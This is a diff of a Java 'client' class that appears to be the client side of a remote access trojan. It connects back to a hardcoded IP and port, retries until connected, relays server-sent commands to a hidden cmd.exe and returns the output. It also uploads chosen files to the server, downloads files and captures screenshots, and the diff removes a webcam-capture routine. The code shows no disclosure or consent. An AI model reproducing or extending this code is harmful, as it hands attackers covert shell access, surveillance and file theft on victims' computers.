@@ -1,7 +1,6 @@
 package clientTest;
 
-import java.awt.AWTException;
-import java.awt.HeadlessException;
+
 import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
@@ -12,7 +11,6 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
@@ -28,48 +26,46 @@ import javax.imageio.ImageIO;
 import javax.sound.sampled.AudioInputStream;
 import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.Clip;
-import javax.sound.sampled.LineUnavailableException;
-import javax.sound.sampled.UnsupportedAudioFileException;
-
-import org.bytedeco.javacv.*;
-
-import static org.bytedeco.javacpp.opencv_core.IplImage;
-import static org.bytedeco.javacpp.opencv_core.cvFlip;
-import static org.bytedeco.javacpp.opencv_imgcodecs.cvSaveImage;
-
 
 public class client {
 	
+	// Server data
 	static String ip = "89.40.116.15";
 	static int port = 6655;
 	
+	static int connectTimer = 5000;
+	
+	// Connection variables
 	static Socket client;
 	static OutputStream outToServer;
 	static InputStream inFromServer;
 	static DataOutputStream out;
 	static DataInputStream in;
 	
+	// cmd process
 	static Process cmd;
 
 	public static void main(String[] args) {
 		
-		String command;
-		
+		// Connect to server
 		connectToServer();
 		
-		System.out.println("Moving on...");
-		
+		// Start cmd process
 		try {
 			cmd = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
 		} catch (IOException e1) {
 			e1.printStackTrace();
 		}
 		
+		// Wait for command from server
+		System.out.println("Waiting for command...");
+		String command;
+		
 		while (true) {
 			try {
 				command = in.readUTF();
 				System.out.println("Recieved: " + command);
-			} catch (IOException e) {
+			} catch (Exception e) {
 				connectToServer();
 				continue;
 			}
@@ -87,9 +83,6 @@ public class client {
 			case "screenshot":
 				screenshot();
 				break;
-			case "webcam":
-				webcam();
-				break;
 			case "sound":
 				sound();
 				break;
@@ -99,64 +92,37 @@ public class client {
 			}
 		}
 	}
-
+	
+	
+	// Play .wmv 
 	private static void sound() {
-		String path;
 		
+		// Receive path to .wav
+		String path;
 		try {
 			path = in.readUTF();
-		} catch (IOException e) {
+		} catch (Exception e) {
 			connectToServer();
 			return;
 		}
 		
+		// Open and play sound
 		File soundFile = new File(path);
-		
 		Clip clip;
 		try {
 			clip = AudioSystem.getClip();
 			AudioInputStream ais = AudioSystem.getAudioInputStream(soundFile);
 			clip.open(ais);
 			clip.start();
-		} catch (LineUnavailableException | UnsupportedAudioFileException | IOException e) {
+		} catch (Exception e) {
 			e.printStackTrace();
-		}
-		
-		
+		}	
 	}
 
-	private static void webcam() {
-
-		FrameGrabber grabber = new VideoInputFrameGrabber(0);
-		OpenCVFrameConverter.ToIplImage converter = new OpenCVFrameConverter.ToIplImage();
-		IplImage img;
-		int i = 0;
-		try {
-            grabber.start();
- 
-            Frame frame = grabber.grab();
-
-            img = converter.convert(frame);
-
-            //the grabbed frame will be flipped, re-flip to make it right
-            cvFlip(img, img, 1);// l-r = 90_degrees_steps_anti_clockwise
-
-            //save
-            cvSaveImage((i++) + "-aa.jpg", img);
-
-       
-            grabber.close();
-           
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-		
-		
-		
-		
-	}
-
+	
+	// Save a screenshot as "MMDDHHmm"
 	private static void screenshot() {
+		
 		// Save current DateTime
 		Date date = new Date();
 		
@@ -167,23 +133,26 @@ public class client {
 		try {
 			BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
 			ImageIO.write(image, "png", new File(ft.format(date)));
-		} catch (IOException | HeadlessException | AWTException e) {
+		} catch (Exception e) {
 			e.printStackTrace();
 		}
-		
 	}
-
+	
+	
+	// Upload file to server
 	private static void sendFile() {
 		
+		// Recieve path
 		String fPath;
-		
 		try {
 			fPath = in.readUTF();
-		} catch (IOException e1) {
+		} catch (Exception e1) {
 			connectToServer();
 			return;
 		}
 		
+		
+		// Prepare file for reading
 		File file;
 		FileInputStream fis;
 		int fileLen = 0;
@@ -192,13 +161,12 @@ public class client {
 			file = new File(fPath);
 			fis = new FileInputStream(file);
 			fileLen = (int) file.length();
-		} catch (FileNotFoundException e) {
+		} catch (Exception e) {
 			e.printStackTrace();
 			return;
 		}
 		
-		
-
+		// Read and send file
 		byte[] buffer = new byte[fileLen];
 
 		try {
@@ -206,33 +174,37 @@ public class client {
 			while (fis.read(buffer) > 0)
 				out.write(buffer);
 			fis.close();
-		} catch (IOException e) {
+		} catch (Exception e) {
 			e.printStackTrace();
 			connectToServer();
 			return;
 		}
-		
-		
 	}
 
+	
+	// Download file from server, save as <fileLen>
 	private static void receiveFile() {
+		
+		// Receive fileLen
 		int fileLen = 0;
 		try {
 			fileLen = in.readInt();
-		} catch (IOException e) {
+		} catch (Exception e) {
 			connectToServer();
 			return;
 		}
 		
+		// Prepare writing to file
 		FileOutputStream fos;
 		
 		try {
 			fos = new FileOutputStream(String.valueOf(fileLen));
-		} catch (FileNotFoundException e) {
+		} catch (Exception e) {
 			e.printStackTrace();
 			return;
 		}
 		
+		// Receive and save file
 		int read = 0, remaining = fileLen;
 		byte[] buffer = new byte[4096];
 		
@@ -242,48 +214,50 @@ public class client {
 				fos.write(buffer, 0, read);
 			}
 			fos.close();
-		} catch (IOException e) {
-			System.out.println("Error while receiving and writing file!");
+		} catch (Exception e) {
 			connectToServer();
 			e.printStackTrace();
 			return;
 		}
 		
 		System.out.println("File recieved!");
-		
 	}
-
+	
+	// Execute cmd commands
 	private static void cmdCommand() {	
 		
+		// Receive cmd command
 		String command;
 		
 		try {
 			command = in.readUTF();
-		} catch (IOException e) {
+		} catch (Exception e) {
 			connectToServer();
 			return;
 		}
 		
 		System.out.println("Command " + command + " recieved");
 		
+		// Execute cmd command
 		BufferedWriter cmdIn = new BufferedWriter(new OutputStreamWriter(cmd.getOutputStream()));
-		
 		try {
 			cmdIn.write(command);
 			cmdIn.newLine();
 			cmdIn.flush();
-		} catch (IOException e1) {
-			e1.printStackTrace();
+		} catch (Exception e) {
+			e.printStackTrace();
+			return;
 		}
 		
 		System.out.println("Command executed");
 		
+		// Read cmd output
 		String cmdOutput = "";
 		CharBuffer cb = CharBuffer.allocate(10000);
 		BufferedReader cmdStream = new BufferedReader(new InputStreamReader(cmd.getInputStream()));
 		
 		try {
-			Thread.sleep(1000);
+			Thread.sleep(200);
 			boolean read = true;
 			while (read) {				
 				if ( cmdStream.ready()) {					
@@ -293,31 +267,38 @@ public class client {
 					if (cb.toString() == null) break;
 				} else break;
 			}
-		} catch (IOException | InterruptedException e) {
+		} catch (Exception e) {
+			e.printStackTrace();
+			return;
 		}
 		
 		System.out.println("Output read");
 		
+		// Send cmd output
 		try {
 			out.writeUTF(cmdOutput);
-		} catch (IOException e) {
+		} catch (Exception e) {
 			connectToServer();
 			return;
 		}
 	}
 
+	
+	// Connect to server
 	private static void connectToServer() {
-
-		boolean connected = false;
 		
+		// Close connection before reconnecting
 		if (client != null)
 			try {
 				client.close();
 			} catch (IOException e1) {}
 		
+		// Try connecting until connected
+		boolean connected = false;
+		
 		while (!connected) {
 			try {
-				Thread.sleep(1000);
+				Thread.sleep(connectTimer);
 				System.out.println("Connecting to Server...");
 				client = new Socket(ip, port);
 				outToServer = client.getOutputStream();
@@ -325,7 +306,7 @@ public class client {
 				out = new DataOutputStream(outToServer);
 				in = new DataInputStream(inFromServer);
 				connected = true;
-			} catch (IOException | InterruptedException e) {
+			} catch (Exception e) {
 				connected = false;
 				System.out.println("Connection failed...");
 			}
@@ -333,6 +314,7 @@ public class client {
 		System.out.println("Connected!");
 	}
 	
+	// Disconnect before exiting program
 	private static void safeExit() {
 		try {
 			client.close();
